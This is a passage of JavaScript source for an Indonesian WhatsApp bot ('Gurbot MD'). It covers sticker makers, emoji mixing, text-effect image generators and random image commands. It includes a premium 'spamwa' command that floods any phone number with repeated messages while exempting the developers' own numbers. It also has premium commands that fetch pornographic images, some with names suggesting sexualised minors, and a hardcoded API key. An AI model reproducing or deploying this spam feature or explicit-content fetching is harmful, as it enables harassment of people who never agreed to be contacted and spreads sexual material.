          let webpToMp4 = await webp2mp4File(buffer)
          conn.sendMessage(from, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: msg })
          fs.unlinkSync(buffer)
        } else {
          reply('*Reply sticker gif dengan pesan #tovideo*')
        }
        break
      case 'emojimix': case 'mixemoji':
      case 'emojmix': case 'emojinua':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`)
        if (!q.includes('+')) return reply(`Format salah, contoh pemakaian !${command} 😅+😭`)
        var emo1 = q.split("+")[0]
        var emo2 = q.split("+")[1]
        if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
        fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
          .then(data => {
            var opt = { packname: 'Gurbot MD', author: 'By Ekuzika OfC' }
            conn.sendImageAsSticker(from, data.results[0].url, msg, opt)
          }).catch((e) => reply(mess.error.api))
        break
      case 'emojimix2': case 'mixemoji2':
      case 'emojmix2': case 'emojinua2': {
        if (!q) return reply(`Example : ${prefix + command} 😅`)
        let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
        for (let res of anu.results) {
          var opt = { packname: 'Gurbot MD', author: 'By Ekuzika OfC' }
          let encmedia = await conn.sendImageAsSticker(from, res.url, msg, opt)
        }
      }
        break
      case 'smoji': case 'semoji':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example : ${prefix + command} 😅`)
        const { SewQueenEmojiToPng } = require("emoji-to-png-sew");
        const emoji = new SewQueenEmojiToPng();
        emoji.get(q)
          .then(emoji => {
            console.log(emoji);
            var opt = { packname: 'Gurbot MD', author: 'By Ekuzika OfC' }
            conn.sendImageAsSticker(from, emoji.images[4].url, msg, opt)
          })
        break
      case 'smeme':
      case 'stikermeme':
      case 'stickermeme':
      case 'memestiker':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        var atas = q.split('|')[0]
        var bawah = q.split('|')[1]
        if (!atas) return reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        if (!bawah) return reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        if (!isImage || !isQuotedImage) {
          reply(mess.wait)
          var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
          var media_url = (await UploadFileUgu(media)).url
          var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
          var opt = { packname: 'Gurbot MD', author: 'By Ekuzika OfC' }
          conn.sendImageAsSticker(from, meme_url, msg, opt)
          fs.unlinkSync(media)
        } else {
          reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        }
        break
      case 'swm':
      case 'stikerwm':
      case 'stickerwm':
      case 'takesticker':
      case 'colong':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        if (!q) return reply(`Kirim video/foto dengan caption ${prefix + command} packname|author atau balas video/foto yang sudah dikirim`)
        var pname = q.split('|')[0]
        var athor = q.split('|')[1]
        reply(mess.wait)
        if (!isImage || !isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
          var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
          reply(mess.wait)
          var opt = { packname: pname, author: athor }
          conn.sendImageAsSticker(from, media, msg, opt)
          fs.unlinkSync(media)
        } else if (isVideo || isQuotedVideo) {
          reply(mess.wait)
          var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
          var opt = { packname: pname, author: athor }
          conn.sendImageAsSticker(from, media, msg, opt)
          fs.unlinkSync(media)
        } else {
          reply(`Kirim video/foto dengan caption ${prefix + command} packname|author atau balas video/foto yang sudah dikirim`)
        }
        break
      case 'sticker': case 's': case 'stiker':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!isImage || !isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
          let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
          reply(mess.wait)
          var rand1 = 'sticker/' + getRandom('.jpeg')
          var rand2 = 'sticker/' + getRandom('.webp')
          fs.writeFileSync(`${rand1}`, buffer)
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                let itustik = fs.readFileSync(`./${rand2}`)
                var opti = { packname: 'Gurabot - MD', author: 'By Ekuzika OfC' }
                conn.sendImageAsSticker(from, itustik, msg, opti)
                fs.unlinkSync(`./${rand1}`)
                fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
                fs.unlinkSync(`./${rand2}`)
              })
            }).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat('webp').save(`${rand2}`)
        } else {
          reply(`Kirim gambar dengan caption ${prefix + command} atau balas gambar yang sudah dikirim`)
        }
        break
      case 'sgif':
      case 'stickergif':
      case 'stikergif':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
          await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
          let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          reply(mess.wait)
          var rand1 = 'sticker/' + getRandom('.mp4')
          var rand2 = 'sticker/' + getRandom('.webp')
          fs.writeFileSync(`${rand1}`, buffer)
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                fs.unlinkSync(`./${rand1}`)
                fs.unlinkSync(`./${rand2}`)
                fs.unlinkSync(buffer)
              })
            })
            .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
            .toFormat('webp')
            .save(`${rand2}`)
        } else {
          reply(`Kirim video dengan caption ${prefix + command} atau balas video yang sudah dikirim`)
        }
        break
      case 'cekjelek': case 'cekcantik': case 'cekganteng': case 'ceksad': case 'cekharam': case 'cekhalal': case 'cekbego': case 'cekanjing': case 'cekbiadab': case 'cekramah': case 'ceksatir': case 'cekmanis': case 'cekpahit': case 'cekhitam': case 'cekrasis': case 'cekbaik': case 'cekjahat': case 'cekkaya': case 'cekmiskin': case 'cekpintar': case 'cekbodoh': case 'cekimut': case 'cekkocak': case 'cekkadang':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let x25 = `./sticker/cekStats_Now.webp`
        let x26 = `./sticker/cekStats_Yes.webp`
        const x27 = [true, false][Math.floor(Math.random() * ([true, false].length))]
        if (x27 == true) {
          conn.sendMessage(from, { sticker: { url: x25 } }, { quoted: { key: { fromMe: false, participant: `${sender}`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "conversation": `[❎] Kamu tidak ${body.slice(4).trim().split(/ +/).shift().toLowerCase()} sama sekali🥴` } } })
        }
        if (x27 == false) {
          conn.sendMessage(from, { sticker: { url: x26 } }, { quoted: { key: { fromMe: false, participant: `${sender}`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "conversation": `[✅] Ya begitulah, Kamu Sangat ${body.slice(4).trim().split(/ +/).shift().toLowerCase()} Sekali 🤥` } } })
        }
        break
      case 'goblokcek': case 'jelekcek': case 'gaycek':
      case 'lesbicek': case 'gantengcek': case 'cantikcek': case 'begocek': case 'suhucek': case 'pintercek':
      case 'jagocek': case 'nolepcek': case 'babicek': case 'bebancek': case 'baikcek':
      case 'jahatcek': case 'anjingcek': case 'haramcek': case 'pakboycek':
      case 'pakgirlcek': case 'sangecek': case 'bapercek': case 'fakboycek': case 'alimcek': case 'suhucek':
      case 'fakgirlcek': case 'kerencek': case 'wibucek': case 'pasarkascek':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        const eyy = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100']
        const yn = eyy[Math.floor(Math.random() * eyy.length)]
        conn.sendMessage(from, { text: `${yn}%` }, { quoted: msg })
        break
      // TEXTPRO
      case 'candy':
      case 'christmas':
      case '3dchristmas':
      case 'sparklechristmas':
      case 'deepsea':
      case 'scifi':
      case 'rainbow':
      case 'waterpipe':
      case 'spooky':
      case 'pencil':
      case 'circuit':
      case 'discovery':
      case 'metalic':
      case 'fiction':
      case 'demon':
      case 'transformer':
      case 'berry':
      case 'thunder':
      case 'magma':
      case '3dstone':
      case 'neonlight':
      case 'glitch':
      case 'harrypotter':
      case 'brokenglass':
      case 'papercut':
      case 'watercolor':
      case 'multicolor':
      case 'neondevil':
      case 'underwater':
      case 'graffitibike':
      case 'snow':
      case 'cloud':
      case 'honey':
      case 'ice':
      case 'fruitjuice':
      case 'biscuit':
      case 'wood':
      case 'chocolate':
      case 'strawberry':
      case 'matrix':
      case 'blood':
      case 'dropwater':
      case 'toxic':
      case 'lava':
      case 'rock':
      case 'bloodglas':
      case 'hallowen':
      case 'darkgold':
      case 'joker':
      case 'wicker':
      case 'firework':
      case 'skeleton':
      case 'blackpink':
      case 'sand':
      case 'glue':
      case '1917':
      case 'leaves': {
        if (!q) return reply(`Uhm... Teksnya?`)
        reply(mess.wait)
        let linktp
        if (/candy/.test(command)) linktp = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
        if (/christmas/.test(command)) linktp = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
        if (/3dchristmas/.test(command)) linktp = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
        if (/sparklechristmas/.test(command)) linktp = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
        if (/deepsea/.test(command)) linktp = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
        if (/scifi/.test(command)) linktp = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
        if (/rainbow/.test(command)) linktp = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
        if (/waterpipe/.test(command)) linktp = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
        if (/spooky/.test(command)) linktp = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
        if (/pencil/.test(command)) linktp = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
        if (/circuit/.test(command)) linktp = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
        if (/discovery/.test(command)) linktp = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
        if (/metalic/.test(command)) linktp = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
        if (/fiction/.test(command)) linktp = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
        if (/demon/.test(command)) linktp = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
        if (/transformer/.test(command)) linktp = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
        if (/berry/.test(command)) linktp = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
        if (/thunder/.test(command)) linktp = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
        if (/magma/.test(command)) linktp = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
        if (/3dstone/.test(command)) linktp = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
        if (/neonlight/.test(command)) linktp = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
        if (/glitch/.test(command)) linktp = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
        if (/harrypotter/.test(command)) linktp = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
        if (/brokenglass/.test(command)) linktp = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
        if (/papercut/.test(command)) linktp = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
        if (/watercolor/.test(command)) linktp = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
        if (/multicolor/.test(command)) linktp = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
        if (/neondevil/.test(command)) linktp = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
        if (/underwater/.test(command)) linktp = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
        if (/graffitibike/.test(command)) linktp = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
        if (/snow/.test(command)) linktp = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
        if (/cloud/.test(command)) linktp = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
        if (/honey/.test(command)) linktp = 'https://textpro.me/honey-text-effect-868.html'
        if (/ice/.test(command)) linktp = 'https://textpro.me/ice-cold-text-effect-862.html'
        if (/fruitjuice/.test(command)) linktp = 'https://textpro.me/fruit-juice-text-effect-861.html'
        if (/biscuit/.test(command)) linktp = 'https://textpro.me/biscuit-text-effect-858.html'
        if (/wood/.test(command)) linktp = 'https://textpro.me/wood-text-effect-856.html'
        if (/chocolate/.test(command)) linktp = 'https://textpro.me/chocolate-cake-text-effect-890.html'
        if (/strawberry/.test(command)) linktp = 'https://textpro.me/strawberry-text-effect-online-889.html'
        if (/matrix/.test(command)) linktp = 'https://textpro.me/matrix-style-text-effect-online-884.html'
        if (/blood/.test(command)) linktp = 'https://textpro.me/horror-blood-text-effect-online-883.html'
        if (/dropwater/.test(command)) linktp = 'https://textpro.me/dropwater-text-effect-872.html'
        if (/toxic/.test(command)) linktp = 'https://textpro.me/toxic-text-effect-online-901.html'
        if (/lava/.test(command)) linktp = 'https://textpro.me/lava-text-effect-online-914.html'
        if (/rock/.test(command)) linktp = 'https://textpro.me/rock-text-effect-online-915.html'
        if (/bloodglas/.test(command)) linktp = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
        if (/hallowen/.test(command)) linktp = 'https://textpro.me/halloween-fire-text-effect-940.html'
        if (/darkgold/.test(command)) linktp = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
        if (/joker/.test(command)) linktp = 'https://textpro.me/create-logo-joker-online-934.html'
        if (/wicker/.test(command)) linktp = 'https://textpro.me/wicker-text-effect-online-932.html'
        if (/firework/.test(command)) linktp = 'https://textpro.me/firework-sparkle-text-effect-930.html'
        if (/skeleton/.test(command)) linktp = 'https://textpro.me/skeleton-text-effect-online-929.html'
        if (/blackpink/.test(command)) linktp = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
        if (/sand/.test(command)) linktp = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
        if (/glue/.test(command)) linktp = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
        if (/1917/.test(command)) linktp = 'https://textpro.me/1917-style-text-effect-online-980.html'
        if (/leaves/.test(command)) linktp = 'https://textpro.me/natural-leaves-text-effect-931.html'
        let anutp = await textpro.textpro(linktp, q)
        conn.sendMessage(from, { image: { url: anutp }, caption: `*Done !*` }, { quoted: msg })
      }
        break
      // EPHOTO360
      case 'glitchtext':
      case 'writetext':
      case 'advancedglow':
      case 'typographytext':
      case 'pixelglitch':
      case 'neonglitch':
      case 'flagtext':
      case 'flag3dtext':
      case 'deletingtext':
      case 'blackpinkstyle':
      case 'glowingtext':
      case 'underwatertext':
      case 'logomaker':
      case 'cartoonstyle':
      case 'papercutstyle':
      case 'watercolortext':
      case 'effectclouds':
      case 'blackpinklogo':
      case 'gradienttext':
      case 'summerbeach':
      case 'luxurygold':
      case 'multicoloredneon':
      case 'sandsummer':
      case 'galaxywallpaper':
      case '1917style':
      case 'makingneon':
      case 'royaltext':
      case 'freecreate':
      case 'galaxystyle':
      case 'lighteffects': {
        if (!q) return reply(`Uhm..Teksnya?`)
        reply(mess.wait)
        let linkpo
        if (/glitchtext/.test(command)) linkpo = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
        if (/writetext/.test(command)) linkpo = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
        if (/advancedglow/.test(command)) linkpo = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
        if (/typographytext/.test(command)) linkpo = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
        if (/pixelglitch/.test(command)) linkpo = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
        if (/neonglitch/.test(command)) linkpo = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
        if (/flagtext/.test(command)) linkpo = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
        if (/flag3dtext/.test(command)) linkpo = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
        if (/deletingtext/.test(command)) linkpo = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
        if (/blackpinkstyle/.test(command)) linkpo = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
        if (/glowingtext/.test(command)) linkpo = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
        if (/underwatertext/.test(command)) linkpo = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
        if (/logomaker/.test(command)) linkpo = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
        if (/cartoonstyle/.test(command)) linkpo = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
        if (/papercutstyle/.test(command)) linkpo = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
        if (/watercolortext/.test(command)) linkpo = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
        if (/effectclouds/.test(command)) linkpo = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
        if (/blackpinklogo/.test(command)) linkpo = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
        if (/gradienttext/.test(command)) linkpo = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
        if (/summerbeach/.test(command)) linkpo = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
        if (/luxurygold/.test(command)) linkpo = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
        if (/multicoloredneon/.test(command)) linkpo = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
        if (/sandsummer/.test(command)) linkpo = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
        if (/galaxywallpaper/.test(command)) linkpo = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
        if (/1917style/.test(command)) linkpo = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
        if (/makingneon/.test(command)) linkpo = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
        if (/royaltext/.test(command)) linkpo = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
        if (/freecreate/.test(command)) linkpo = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
        if (/galaxystyle/.test(command)) linkpo = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
        if (/lighteffects/.test(command)) linkpo = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
        let haldwhd = await ephoto(linkpo, q)
        conn.sendMessage(from, { image: { url: haldwhd }, caption: `*Done !*` }, { quoted: msg })
      }
        break
      // PHOTOOXY
      case 'shadow':
      case 'write':
      case 'romantic':
      case 'burnpaper':
      case 'smoke':
      case 'narutobanner':
      case 'love':
      case 'undergrass':
      case 'doublelove':
      case 'coffecup':
      case 'underwaterocean':
      case 'smokyneon':
      case 'starstext':
      case 'rainboweffect':
      case 'balloontext':
      case 'metalliceffect':
      case 'embroiderytext':
      case 'flamingtext':
      case 'stonetext':
      case 'writeart':
      case 'summertext':
      case 'wolfmetaltext':
      case 'nature3dtext':
      case 'rosestext':
      case 'naturetypography':
      case 'quotesunder':
      case 'shinetext': {
        if (!q) return reply(`Uhm..Teksnya?`)
        reply(mess.wait)
        let linkep
        if (/stonetext/.test(command)) linkep = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
        if (/writeart/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
        if (/summertext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
        if (/wolfmetaltext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
        if (/nature3dtext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
        if (/rosestext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
        if (/naturetypography/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
        if (/quotesunder/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
        if (/shinetext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
        if (/shadow/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
        if (/write/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
        if (/romantic/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
        if (/burnpaper/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
        if (/smoke/.test(command)) linkep = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
        if (/narutobanner/.test(command)) linkep = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
        if (/love/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
        if (/undergrass/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
        if (/doublelove/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
        if (/coffecup/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
        if (/underwaterocean/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
        if (/smokyneon/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
        if (/starstext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
        if (/rainboweffect/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
        if (/balloontext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
        if (/metalliceffect/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
        if (/embroiderytext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
        if (/flamingtext/.test(command)) linkep = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
        let dehe = await photooxy.photoOxy(linkep, q)
        conn.sendMessage(from, { image: { url: dehe }, caption: `*Done !*` }, { quoted: msg })
      }
        break
      case 'boneka': case 'cecan': case 'cogan': case 'darkjokes': case 'islamic': case 'mobil': case 'programing': case 'tatasurya': case 'wallhp':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        const x35 = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`));
        const x36 = x35[Math.floor(Math.random() * (x35.length))]
        conn.sendMessage(from, { image: { url: x36 }, caption: "Done!", mentions: [sender] }, { quoted: msg })
        break

      // PREMIUM ONLY
      // BIAR GAK DI SPAM

      case 'bocil': case 'ukhty': case 'santuy': case 'rika': case 'hijaber':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        reply(mess.wait)
        const x33 = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`));
        const x34 = x33[Math.floor(Math.random() * (x33.length))]
        conn.sendMessage(from, { video: { url: x34.url }, caption: "Done!", mentions: [sender] }, { quoted: msg })
        break
      case 'chiisaihentai': case 'trap': case 'blowjob': case 'yaoi': case 'ecchi': case 'ahegao': case 'hololewd': case 'sideoppai': case 'animefeets': case 'animebooty': case 'animethighss': case 'hentaiparadise': case 'animearmpits': case 'hentaifemdom': case 'lewdanimegirls': case 'biganimetiddies': case 'animebellybutton': case 'hentai4everyone': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        reply(mess.wait)
        conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${setting.api_lolkey}` }, caption: `Nih ${command}📸` }, { quoted: msg })
      }
        break
      case 'bj': case 'ero': case 'cum': case 'feet': case 'yuri': case 'trap': case 'lewd': case 'feed': case 'eron': case 'solo': case 'gasm': case 'poke': case 'anal': case 'holo': case 'tits': case 'kuni': case 'kiss': case 'erok': case 'smug': case 'baka': case 'solog': case 'feetg': case 'lewdk': case 'waifu': case 'pussy': case 'femdom': case 'cuddle': case 'hentai': case 'eroyuri': case 'cum_jpg': case 'blowjob': case 'erofeet': case 'holoero': case 'classic': case 'erokemo': case 'fox_girl': case 'futanari': case 'lewdkemo': case 'wallpaper': case 'pussy_jpg': case 'kemonomimi': case 'nsfw_avatar': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        reply(mess.wait)
        conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${setting.api_lolkey}` }, caption: `Nih ${command}📸` }, { quoted: msg })
      }
        break
      case 'spamwa': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 628xxxx|pesan spam nya|jumlah pesan\nNomor awal dari  62/kode telepon negara`)
        let [nomor_spam, pesan_spam, jumlah_pesan] = q.split('|')
        if (!nomor_spam) return reply(`[ ! ] Masukan nomor yang ingin di spam\n*Contoh:* ${sender.split('@')[0]}|Test spam banh|5`)
        if (!pesan_spam) return reply(`[ ! ] Masukan Pesan kamu ke nomor yang ingin di spam\n*Contoh:* ${sender.split('@')[0]}|Test spam banh|5`)
        if (!jumlah_pesan) return reply(`[ ! ] Masukan jumlah spam\n*Contoh:* ${sender.split('@')[0]}|Test spam banh|5`)
        let devv = '628889616144@s.whatsapp.net'
        let devv2 = '6289519009370@s.whatsapp.net'
        let marek_slebb = '0@s.whatsapp.net'
        let fixnomor = nomor_spam + '@s.whatsapp.net'
        if (nomor_spam == devv) return reply('Itu developer gua')
        if (nomor_spam == devv2) return reply('Itu developer gua')
        if (jumlah_pesan > 25) return reply(`*[ ⚠️ ]* PESAN TERLALU BANYAK\nJUMLAH PESAN TIDAK BOLEH LEBIH DARI 25.`)
        reply(`*Success Spam WhatsApp*

ke nomor: ${nomor_spam}
pesan spam: ${pesan_spam}
jumlah spam: ${jumlah_pesan}`)
        let fixjumlah = jumlah_pesan ? jumlah_pesan * 1 : 10
        for (let i = fixjumlah; i > 0; i--) {
          if (i !== 0) conn.sendMessage(fixnomor, { text: pesan_spam, mentions: [marek_slebb] }, { quoted: ftroli })
        }
      }
        break
      // LOGO MAKER
      case 'girlneko': case 'gilrneko':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q1 && !q2) return reply("Masukkan text\nContoh? #girlneko aku&kamu")
        reply("[❗] SEDANG DIPROSES")
        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/nekogirl1?text1=${q1}&text2=${q2}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
        break
      case 'sadboy':
